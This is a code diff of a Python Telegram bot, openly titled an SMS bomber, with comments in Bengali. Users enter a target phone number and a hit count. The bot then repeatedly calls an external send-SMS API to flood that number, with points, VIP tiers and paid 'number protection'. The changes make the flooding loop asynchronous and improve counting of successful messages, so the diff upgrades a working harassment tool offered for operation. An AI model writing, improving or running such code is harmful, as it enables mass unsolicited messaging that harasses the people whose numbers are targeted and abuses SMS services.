@@ -1,10 +1,11 @@
 import sys
 import subprocess
 import os
+import asyncio
 from threading import Thread
 from flask import Flask
 
-# 🌐 Render Free Web Service Keep-Alive Server (ফ্রি হোস্টিং সেফটি)
+# 🌐 Render Free Web Service Keep-Alive Server
 flask_app = Flask('')
 
 @flask_app.route('/')
@@ -38,7 +39,6 @@ for pkg in needed_packages:
 import logging
 import requests
 import json
-import time
 import certifi
 import ssl
 from datetime import datetime, timedelta
@@ -66,7 +66,7 @@ REFERRAL_POINTS = 15      # রেফার বোনাস
 PROTECTION_COST = 100     # নম্বর প্রটেকশন ফি (পয়েন্ট)
 COOLDOWN_SECONDS = 30     # স্প্যাম রোধে ওয়েটিং টাইম (সেকেন্ড)
 
-# ===================== MONGODB কানেকশন =====================
+# ===================== MONGODB KANNEKTION =====================
 memory_users = {}
 memory_settings = {
     "api_url": "https://masterapi-sable.vercel.app/send?phone=",
@@ -89,7 +89,7 @@ try:
         MONGO_URI, 
         server_api=ServerApi('1'),
         ssl_context=custom_ssl_context,
-        serverSelectionTimeoutMS=5000
+        serverSelectionTimeoutMS=10000
     )
     db = mongo_client["sms_bomber_bot"]
     users_col = db["users"]
@@ -100,7 +100,7 @@ try:
     print("🍃 MongoDB Atlas Connected Successfully!")
     print("==================================================")
 except Exception as e:
-    print(f"⚠️ MongoDB Atlas Warning: {e}. Using Hybrid Fail-Safe Storage.")
+    print(f"⚠️ MongoDB Atlas Warning: {e}. Using Hybrid Storage.")
 
 # ===================== ডাটাবেজ হেল্পার ফাংশন =====================
 def get_settings():
@@ -148,19 +148,23 @@ def init_user(user_id, username="N/A", first_name="User"):
 
     try:
         if users_col is not None:
-            u = users_col.find_one({"user_id": user_id})
-            if not u:
-                users_col.insert_one(memory_users[user_id])
-            else:
-                users_col.update_one(
-                    {"user_id": user_id},
-                    {"$set": {"username": memory_users[user_id]["username"],
-                              "first_name": memory_users[user_id]["first_name"]}}
-                )
-                memory_users[user_id]["points"] = u.get("points", memory_users[user_id]["points"])
-                memory_users[user_id]["is_vip"] = u.get("is_vip", memory_users[user_id]["is_vip"])
-                memory_users[user_id]["vip_expiry"] = u.get("vip_expiry", memory_users[user_id]["vip_expiry"])
-                memory_users[user_id]["referral_count"] = u.get("referral_count", memory_users[user_id]["referral_count"])
+            save_doc = {
+                "user_id": user_id,
+                "username": memory_users[user_id]["username"],
+                "first_name": memory_users[user_id]["first_name"],
+                "points": memory_users[user_id]["points"],
+                "is_vip": memory_users[user_id]["is_vip"],
+                "vip_expiry": memory_users[user_id]["vip_expiry"],
+                "last_daily": memory_users[user_id]["last_daily"],
+                "last_bombing": memory_users[user_id]["last_bombing"],
+                "referred_by": memory_users[user_id]["referred_by"],
+                "referral_count": memory_users[user_id]["referral_count"],
+                "total_bombing": memory_users[user_id]["total_bombing"],
+                "total_success": memory_users[user_id]["total_success"],
+                "total_failed": memory_users[user_id]["total_failed"],
+                "total_requests": memory_users[user_id]["total_requests"]
+            }
+            users_col.update_one({"user_id": user_id}, {"$set": save_doc}, upsert=True)
     except Exception as e:
         print(f"MongoDB Sync Error: {e}")
 
@@ -182,6 +186,33 @@ def check_vip_status(user_id):
             return False
         return True
     return u.get("is_vip", False)
+
+# 💥 API থেকে সফল ও ব্যর্থ SMS সংখ্যা বের করার পাওয়ারফুল এক্সট্র্যাক্টর
+def extract_sms_counts(data_obj):
+    if isinstance(data_obj, str):
+        try: data_obj = json.loads(data_obj)
+        except: return 0, 0
+    
+    if not isinstance(data_obj, dict):
+        return 0, 0
+
+    sent = 0
+    for key in ["total_sent", "sent", "success", "total_success", "success_sms", "successful"]:
+        if key in data_obj and data_obj[key] is not None:
+            try:
+                sent = int(data_obj[key])
+                break
+            except: pass
+
+    failed = 0
+    for key in ["total_failed", "failed", "failure", "total_failure", "fail_sms"]:
+        if key in data_obj and data_obj[key] is not None:
+            try:
+                failed = int(data_obj[key])
+                break
+            except: pass
+
+    return sent, failed
 
 temp_data = {}
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -366,7 +397,7 @@ async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(u_id, f"📢 <b>ADMIN NOTICE</b>\n\n{msg_to_send}", parse_mode="HTML")
             s += 1
         except: f += 1
-        time.sleep(0.04)
+        await asyncio.sleep(0.04)
     await msg.edit_text(f"✅ <b>ব্রডকাস্ট সম্পন্ন!</b>\n\n🟢 সফল: {s}\n🔴 ব্যর্থ: {f}")
 
 async def admin_makecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -742,7 +773,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ নম্বর সেট: <code>{num}</code>\n\n💥 কত বার (হিট) বোম্বিং করবেন?\n{limit_info}", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
-    # ===== বোম্বিং ও লোডিং প্রগ্রেস বার প্রসেস =====
+    # ===== বোম্বিং ও লোডিং প্রগ্রেস বার প্রসেস (NON-BLOCKING ASYNC FIX + ACCUMULATOR) =====
     elif step == 'awaiting_amount':
         try:
             amount = int(message)
@@ -782,6 +813,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             current_api = st.get('api_url', "https://masterapi-sable.vercel.app/send?phone=")
             
             spinners = ["⏳", "⌛", "⚡", "💥"]
+            loop = asyncio.get_event_loop()
             
             for i in range(amount):
                 # 🛑 বোম্বিং ক্যানসেল চেক
@@ -797,16 +829,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     break
 
                 try:
-                    api_response = requests.get(f"{current_api}{number}", timeout=30)
+                    # 💥 নন-ব্লকিং অ্যাসিনক্রোনাস এপিআই রিকোয়েস্ট
+                    api_response = await loop.run_in_executor(
+                        None, 
+                        lambda: requests.get(f"{current_api}{number}", timeout=15)
+                    )
                     if api_response.status_code == 200:
                         response_data = api_response.json()
                         if isinstance(response_data, str): response_data = json.loads(response_data)
                         if isinstance(response_data, dict):
                             last_response = response_data
-                            sent = response_data.get("total_sent", 0)
-                            failed = response_data.get("total_failed", 0)
-                            total_sent_count += int(sent)
-                            total_failed_count += int(failed)
+                            sent, failed = extract_sms_counts(response_data)
+                            total_sent_count += sent
+                            total_failed_count += failed
                 except Exception as e: print(f"Error: {e}")
                 
                 percent = int(((i + 1) / amount) * 100)
@@ -818,15 +853,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await msg.edit_text(
                         f"💣 <b>BOMBING IN PROGRESS...</b> {sp}\n\n"
                         f"📱 টার্গেট: <code>{number}</code>\n"
-                        f"📊 প্রগ্রেস: <code>[{bar}]</code> <b>{percent}%</b>\n"
-                        f"💥 হিট: <b>{i+1}/{amount}</b>\n\n"
+                        f"📊 প্রগ্রেস: <code>[{bar}]</code> <b>{percent}%</b> (হিট: {i+1}/{amount})\n\n"
                         f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
                         f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>",
                         parse_mode="HTML",
                         reply_markup=cancel_kbd
                     )
                 except: pass
-                time.sleep(1)
+                
+                # 💥 নন-ব্লকিং স্লিপ
+                await asyncio.sleep(1)
             
             # যদি ক্যানসেল না করা হয়ে থাকে
             if not temp_data.get(user_id, {}).get('cancel', False):
@@ -859,10 +895,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 result_message = (
                     f"✅ <b>বোম্বিং সফলভাবে সম্পন্ন!</b> ✅\n\n"
                     f"📱 টার্গেট: <code>{number}</code>\n"
-                    f"💥 হিট: {amount} বার\n"
-                    f"✅ মোট সফল SMS: {total_sent_count}\n"
-                    f"❌ মোট ব্যর্থ SMS: {total_failed_count}\n"
-                    f"📊 সফলতার হার: {success_rate}%\n"
+                    f"💥 হিট সম্পন্ন: <b>{amount} / {amount} বার</b>\n"
+                    f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
+                    f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
+                    f"📊 সফলতার হার: <b>{success_rate}%</b>\n"
                     f"💰 খরচ: <b>{cost_text}</b>\n"
                     f"💳 অবশিষ্ট ব্যালেন্স: <b>{balance_text}</b>\n\n"
                     f"🛠 সার্ভিস: {service}\n"
@@ -899,7 +935,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     print("="*50)
-    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH FULL RENDER COMPATIBILITY!")
+    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH ACCURATE DATA & ANIMATION!")
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
